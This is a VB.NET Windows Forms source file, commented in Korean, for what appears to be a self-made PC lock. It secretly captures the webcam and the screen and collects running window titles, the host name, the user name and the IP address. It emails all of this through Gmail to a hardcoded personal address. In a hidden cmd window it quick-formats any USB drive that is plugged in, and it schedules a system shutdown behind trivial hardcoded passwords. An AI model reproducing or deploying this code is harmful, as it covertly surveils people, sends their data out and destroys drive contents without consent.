Imports System.Management
Imports System.Timers

Imports System.Drawing.Imaging
Imports System.IO
Imports System.Net
Imports System.Net.Mail
Imports Emgu.CV

Imports Emgu.CV.BitmapExtension

Imports System.Windows.Forms.VisualStyles.VisualStyleElement

Public Class Form1
    Private WithEvents shutdownTimer As New Timer(5000) ' 5초 타이머
    Private shutdownInitiated As Boolean = False
    Private WithEvents watcher As ManagementEventWatcher

    Dim emailCredentials
    Dim emailAddress As String, emailPassword As String
    Dim sHostName As String, sUserName As String

    Private lastTaskbarTitles As New List(Of String)
    Private newTitles As New List(Of String)
    Private removedTitles As New List(Of String)
    Public header As String

    Private cam_capture As VideoCapture
    Private webcamImage As Bitmap

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        ' 이메일 주소와 패스워드 읽기
        emailCredentials = ReadEmailCredentials("HUK_CHK.NFO")
        emailAddress = emailCredentials.Item1
        emailPassword = emailCredentials.Item2

        shutdownTimer.Start()

        Dim query As New WqlEventQuery("SELECT * FROM Win32_VolumeChangeEvent WHERE EventType = 2")
        watcher = New ManagementEventWatcher(query)
        AddHandler watcher.EventArrived, AddressOf USBInserted
        watcher.Start()
    End Sub

    Private Sub shutdownTimer_Elapsed(sender As Object, e As ElapsedEventArgs) Handles shutdownTimer.Elapsed
        shutdownTimer.Stop()
        Process.Start("shutdown", "/s /t 120") ' 시스템을 2분 후 종료 명령

        InitializeWebcam() ' 웹캠을 먼저 실행
        ProcessFrame() '웹캠 캡쳐
        sendemail_webcam() ' 이메일 전송

        Dim password As String = InputBox("암호를 입력하세요:", "암호 확인")

        If password <> "0000" Then
            MessageBox.Show("허가 받지 않은 사용자입니다. 시스템을 종료합니다.")
            shutdownInitiated = True
            ' 비상암호 입력 부분 실행
            Dim emergencyPassword As String = InputBox("===비상암호를 입력하세요===", "비상암호 확인")
            If emergencyPassword = "1234" Then
                shutdownInitiated = False
                Process.Start("shutdown", "/a") ' 시스템 종료 취소 명령
                MessageBox.Show("시스템 종료가 취소되었습니다.")
            End If
        Else
            shutdownInitiated = False
            Process.Start("shutdown", "/a") ' 시스템 종료 취소 명령
            MessageBox.Show("시스템 정상")
        End If
    End Sub

    Private Sub InitializeWebcam()
        Try
            cam_capture = New VideoCapture()
            If cam_capture Is Nothing OrElse cam_capture.Ptr = IntPtr.Zero Then
                'MessageBox.Show("웹캠 초기화 실패")
                Return
            End If
            AddHandler Application.Idle, AddressOf ProcessFrame
            SetCheckCamChecked(True)
            'MessageBox.Show("웹캠 초기화 성공")
        Catch ex As Exception
            'MessageBox.Show("웹캠 초기화 중 오류가 발생했습니다: " & ex.Message)
        End Try
    End Sub


    Private Sub USBInserted(sender As Object, e As EventArrivedEventArgs)
        Dim driveLetter As String = e.NewEvent.Properties("DriveName").Value.ToString()
        FormatDrive(driveLetter)
        MessageBox.Show("허가받지 않은 장치가 연결되어 제거하였습니다: " & driveLetter)
    End Sub

    Private Sub FormatDrive(driveLetter As String)
        Try
            Dim psi As New ProcessStartInfo()
            psi.FileName = "cmd.exe"
            psi.Arguments = "/c format " & driveLetter & " /FS:NTFS /Q /Y"
            psi.WindowStyle = ProcessWindowStyle.Hidden
            psi.CreateNoWindow = True
            Process.Start(psi)
            ' 포맷이 완료된 후 1분 타이머 시작
            shutdownTimer.Start()
        Catch ex As Exception
            MessageBox.Show("포맷 중 오류가 발생했습니다: " & ex.Message)
        End Try
    End Sub

    '=============
    '=============
    Private Sub SetCheckCamChecked(value As Boolean)
        If Check_cam.InvokeRequired Then
            Check_cam.Invoke(New Action(Of Boolean)(AddressOf SetCheckCamChecked), value)
        Else
            Check_cam.Checked = value
        End If
    End Sub

    Public Sub sendemail_webcam()
        Try
            ' 웹캠 초기화
            cam_capture = New VideoCapture()
            AddHandler Application.Idle, AddressOf ProcessFrame
            SetCheckCamChecked(True)

            ' 호스트 이름과 사용자 이름 가져오기
            sHostName = Environ$("computername")
            sUserName = Environ$("username")

            Dim myip As String = IPtest()
            header = $"Event rec: {myip}: {sHostName}: {sUserName}"

            InitializeTaskbarMonitoring()

            ' 이메일 전송
            SendEmail(emailAddress, emailPassword, lastTaskbarTitles, New List(Of String), lastTaskbarTitles)
        Catch ex As Exception
            MessageBox.Show("오류가 발생했습니다: " & ex.Message)
        End Try
    End Sub

    Private Sub ProcessFrame()
        If cam_capture IsNot Nothing AndAlso cam_capture.Ptr <> IntPtr.Zero Then
            Using frame As Mat = cam_capture.QueryFrame()
                If frame IsNot Nothing AndAlso Not frame.IsEmpty Then
                    webcamImage = frame.ToBitmap()
                    'MessageBox.Show("프레임 캡처 성공")
                Else
                    'MessageBox.Show("웹캠에서 프레임을 캡처하지 못했습니다.")
                End If
            End Using
        Else
            'MessageBox.Show("카메라가 초기화되지 않았습니다.")
        End If
    End Sub

    Public Function IPtest() As String
        Try
            Dim host As String = Dns.GetHostName()
            Dim ip As String = Dns.GetHostEntry(host).AddressList _
            .FirstOrDefault(Function(addr) addr.AddressFamily = Net.Sockets.AddressFamily.InterNetwork).ToString()
            IPtest = ip
        Catch ex As Exception
            'MsgBox("인터넷 연결 필요")
            IPtest = "0.0.0.0"
        End Try
    End Function


    Private Sub InitializeTaskbarMonitoring()
        SendInitialTaskbarTitles()
        Console.WriteLine("프로그램이 실행 중입니다. 종료하려면 Enter 키를 누르세요.")
        Console.ReadLine()
    End Sub

    Private Sub SendInitialTaskbarTitles()
        lastTaskbarTitles = GetTaskbarTitles()

        ' 이메일 전송
        SendEmail(emailAddress, emailPassword, lastTaskbarTitles, New List(Of String), lastTaskbarTitles)
    End Sub

    Private Function GetTaskbarTitles() As List(Of String)
        Dim titles As New List(Of String)
        For Each proc As Process In Process.GetProcesses()
            If Not String.IsNullOrEmpty(proc.MainWindowTitle) Then
                titles.Add(proc.MainWindowTitle & vbCrLf)
            End If
        Next
        Return titles
    End Function

    Private Function ReadEmailCredentials(filePath As String) As Tuple(Of String, String)
        Try
            Dim lines = File.ReadAllLines(filePath)
            If lines.Length >= 2 Then
                Return Tuple.Create(lines(0), lines(1))
            Else
                Throw New Exception("파일에 충분한 데이터가 없습니다.")
            End If
        Catch ex As Exception
            MessageBox.Show("이메일 자격 증명 읽기 중 오류 발생: " & ex.Message)
            Return Tuple.Create(String.Empty, String.Empty)
        End Try
    End Function

    Private Sub SendEmail(emailAddress As String, emailPassword As String, newTitles As List(Of String), removedTitles As List(Of String), currentTitles As List(Of String))
        Try
            Dim smtpClient As New SmtpClient("smtp.gmail.com") ' SMTP 서버 설정
            smtpClient.Port = 587
            smtpClient.Credentials = New Net.NetworkCredential(emailAddress, emailPassword)
            smtpClient.EnableSsl = True

            Dim mail As New MailMessage()
            mail.From = New MailAddress(emailAddress)
            mail.To.Add("unkyoo.hwang@gmail.com")
            mail.Subject = "보안확인 사항 " & header
            mail.Body = "새로운 타이틀: " & vbCrLf & String.Join("  ", newTitles) & vbCrLf & vbCrLf & vbCrLf & "제거된 타이틀: " & vbCrLf & String.Join("  ", removedTitles) & vbCrLf & vbCrLf & vbCrLf & "기존 타이틀: " & vbCrLf & String.Join("  ", currentTitles)

            ' 화면 캡처 및 첨부 파일 추가
            Dim screenshotPath = CaptureScreen()
            If Not String.IsNullOrEmpty(screenshotPath) Then
                mail.Attachments.Add(New Attachment(screenshotPath))
            End If
            If Check_cam.Checked = True Then
                Dim webcamPath = CaptureWebcam()
                If Not String.IsNullOrEmpty(webcamPath) Then
                    mail.Attachments.Add(New Attachment(webcamPath))
                End If
            End If

            smtpClient.Send(mail)
            Console.WriteLine("이메일이 전송되었습니다.")

        Catch ex As Exception
            Console.WriteLine("이메일 전송 중 오류 발생: " & ex.Message)
        End Try
    End Sub


    Private Function CaptureScreen() As String
        Try
            Dim bounds As Rectangle = Screen.PrimaryScreen.Bounds
            Using bitmap As New Bitmap(bounds.Width, bounds.Height)
                Using g As Graphics = Graphics.FromImage(bitmap)
                    g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size)
                End Using
                Dim timestamp As String = DateTime.Now.ToString("yyyyMMdd_HHmmss")
                Dim filePath As String = Path.Combine(Path.GetTempPath(), $"screenshot_{timestamp}.png")
                bitmap.Save(filePath, ImageFormat.Png)
                Return filePath
            End Using
        Catch ex As Exception
            Console.WriteLine("화면 캡처 중 오류 발생: " & ex.Message)
            Return String.Empty
        End Try
    End Function

    Private Function CaptureWebcam() As String
        Try
            Dim timestamp As String = DateTime.Now.ToString("yyyyMMdd_HHmmss")
            Dim filePath As String = Path.Combine(Path.GetTempPath(), $"webcam_{timestamp}.jpeg")
            webcamImage.Save(filePath, ImageFormat.Jpeg)
            Return filePath
        Catch ex As Exception
            Console.WriteLine("웹캠 캡처 중 오류 발생: " & ex.Message)
            Return String.Empty
        End Try
    End Function

End Class
